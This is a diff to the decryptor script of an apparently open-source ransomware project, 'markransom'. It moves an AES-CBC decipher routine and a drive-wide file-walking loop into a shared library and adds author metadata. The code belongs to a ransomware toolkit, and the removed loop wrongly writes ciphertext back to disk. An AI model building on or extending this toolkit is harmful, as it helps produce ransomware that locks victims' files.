@@ -4,22 +4,17 @@
 # https://www.github.com/R3nt0n/markransom
 
 
+__author__ = "r3nt0n"
+__license__ = "GPL 3.0"
+__version__ = "1.0.0"
+__email__ = "r3nt0n@protonmail.com"
+__status__ = "Development"
+
 import os, sys
 import argparse
-from base64 import b64decode
 
-from Crypto.Cipher import AES
+from lib.cryptor import find_root_paths, find_files_and_do, decipher
 
-from markransom import find_root_paths, find_files
-
-
-def decipher(cipher_data, key):
-    iv = (cipher_data.split(':%:%:&:%:%:'))[0]
-    cipher_text = (cipher_data.split(':%:%:&:%:%:'))[1]
-    d = AES.new(key, AES.MODE_CBC, iv=iv)
-    decipher_data = d.decrypt(cipher_text)
-    decipher_data = b64decode(decipher_data)
-    return decipher_data
 
 
 def proc_args():
@@ -48,23 +43,11 @@ def main():
     e.append(ext)
     file_list = []
     # Find files
-    if not crypted_file:
-        root_paths = find_root_paths()
-        file_list = find_files(root_paths, e, 'non_excluded_mps')
+    if crypted_file:
+        status = decipher(crypted_file, key, ext)
     else:
-        file_list.append(crypted_file)
-    # Decrypt each file
-    for crypted_file in file_list:
-        try:
-            with open(crypted_file, 'rb') as f_crypt:
-                cipher_data = f_crypt.read()
-            data = decipher(cipher_data, key)
-            prev_name = crypted_file[:-6]
-            with open(prev_name, 'wb+') as f_plain:
-                f_plain.write(cipher_data)
-            os.remove(crypted_file)
-        except:
-            pass
+        root_paths = find_root_paths()
+        file_list = find_files_and_do(root_paths, e, key, action='decrypt', crypted_ext=ext)
 
 
 if __name__ == '__main__':
